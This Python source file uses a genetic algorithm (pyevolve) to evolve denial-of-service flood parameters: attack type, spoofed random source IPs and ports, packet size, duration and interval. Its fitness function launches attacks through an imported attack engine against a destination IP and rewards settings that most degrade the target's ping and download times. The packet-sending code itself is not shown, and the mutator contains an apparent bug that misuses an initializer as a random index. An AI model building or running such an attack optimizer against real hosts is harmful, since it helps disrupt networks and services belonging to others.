from random import choice
from threading import Thread

import requests
import pyping

from ThreadWithReturnValue import ThreadWithReturnValue

from attack_engine import *
from pyevolve import GenomeBase
from pyevolve import Util


def avg_time(func, duration, address):
    finish = time() + duration
    count = 0
    accumulator = 0.0
    while time() < finish:
        count += 1
        accumulator += func(address)
    return accumulator / count


def download_url(url):
    start_time = time()
    try:
        r = requests.get(url)
        i = 0 if r.status_code == 200 else 1
    except requests.exceptions.RequestException:
        i = 1
    if i == 0:
        return time() - start_time
    else:
        return Config._infinity_


def ping_avg(destination):
    assert pyping.is_valid_ip4_address(destination)
    r = pyping.ping(destination)
    return Config._infinity_ if r.avg_rtt is None else float(r.avg_rtt)


def eval_func(genome):
    attack = Thread(target=start_attack, args=(
        genome.attack_type, genome.duration, genome.interval, genome.random_source_ip, genome.random_source_port,
        genome.random_destination_port, genome.source_ip, genome.source_port, genome.destination_ip,
        genome.destination_port, genome.data_length))

    attack.start()
    ping = ThreadWithReturnValue(target=avg_time, args=(ping_avg, genome.duration, genome.destination_ip))
    download = ThreadWithReturnValue(target=avg_time, args=(download_url, genome.duration, Config.url_to_download))
    ping.start()
    download.start()
    # sleep(genome.duration)
    # score = download_url('http://www.google.ru', duration=genome.duration)
    # ping = ping_avg(genome.destination_ip, duration=genome.duration)
    attack.join()
    score = ping.join() + download.join()
    return score


def rand_init(genome, i):
    if hasattr(Config.attack_constants[i], '__len__'):
        genome[i] = choice(Config.attack_constants[i])
    else:
        genome[i] = Config.attack_constants[i]()
    return genome


def attack_initializer(genome, **args):
    for i in xrange(len(genome)):
        genome = rand_init(genome, i)


def attack_simple_mutator(genome, **args):
    if args["pmut"] <= 0.0:
        return 0
    list_size = len(genome)
    mutations = args["pmut"] * list_size

    if mutations < 1.0:
        mutations = 0
        for it in xrange(list_size):
            if Util.randomFlipCoin(args["pmut"]):
                genome = rand_init(genome, it)
            mutations += 1
    else:
        for it in xrange(int(round(mutations))):
            which_gene = rand_init(0, list_size - 1)
            genome = rand_init(genome, which_gene)

    return mutations


def attack_crossover(genome, **args):
    g_mom = args["mom"]
    g_dad = args["dad"]

    sister = g_mom.clone()
    brother = g_dad.clone()
    sister.resetStats()
    brother.resetStats()

    for i in xrange(len(g_mom)):
        if Util.randomFlipCoin(0.5):
            sister[i], brother[i] = brother[i], sister[i]
    return sister, brother


class AttackGenome(GenomeBase.GenomeBase):
    def __repr__(self):
        return str.format(
            """
        Attack type: {0!r}

        Source: {1}:{2}
        Random source ip: {3!r}
        Random source port: {4!r}

        Destination: {5}:{6}
        Random destination port: {7!r}

        Data length: {8}
        Duration: {9}
        Interval: {10}
        """, self.attack_type, self.source_ip, self.source_port, self.random_source_ip, self.random_source_port,
            self.destination_ip, self.destination_port, self.random_destination_port, self.data_length, self.duration,
            self.interval)

    def __len__(self):
        return len(self.to_array())

    def __init__(self, destination_ip, source_ip='192.168.1.1', source_port=20, destination_port=30, data_length=10,
                 duration=0, interval=0, random_source_ip=True, random_source_port=True, random_destination_port=True,
                 attack_type=AttackType.UDP):
        GenomeBase.GenomeBase.__init__(self)
        self.initializator.set(attack_initializer)
        self.mutator.set(attack_simple_mutator)
        self.crossover.set(attack_crossover)
        self.evaluator.set(eval_func)
        self.destination_ip = destination_ip
        self.attack_type = attack_type
        assert (type(duration) is int)
        self.duration = duration
        self.interval = interval
        self.random_source_ip = random_source_ip
        self.random_source_port = random_source_port
        self.random_destination_port = random_destination_port
        self.source_ip = source_ip
        self.source_port = source_port
        self.destination_port = destination_port
        assert type(data_length) is int
        self.data_length = data_length

    def to_array(self):
        return [self.attack_type, self.duration, self.interval, self.random_source_ip, self.random_source_port,
                self.random_destination_port, self.source_ip[:], self.source_port, self.destination_port,
                self.data_length]

    def __getitem__(self, i):
        return self.to_array()[i]

    def __setitem__(self, i, item):
        if i == 0:
            self.attack_type = item
        elif i == 1:
            assert type(item) is int
            self.duration = item
        elif i == 2:
            self.interval = item
        elif i == 3:
            self.random_source_ip = bool(item)
        elif i == 4:
            self.random_source_port = bool(item)
        elif i == 5:
            self.random_destination_port = bool(item)
        elif i == 6:
            self.source_ip = item
        elif i == 7:
            self.source_port = item
        elif i == 8:
            self.destination_port = item
        elif i == 9:
            assert type(item) is int
            self.data_length = item
        else:
            raise IndexError

    def copy(self, g):
        g.attack_type = self.attack_type
        g.duration = self.duration
        g.interval = self.interval
        g.random_source_ip = self.random_source_ip
        g.random_source_port = self.random_source_port
        g.random_destination_port = self.random_destination_port
        g.source_ip = self.source_ip[:]
        g.source_port = self.source_port
        g.destination_port = self.destination_port
        g.data_length = self.data_length

    def clone(self):
        new_copy = AttackGenome(self.destination_ip)
        self.copy(new_copy)
        return new_copy
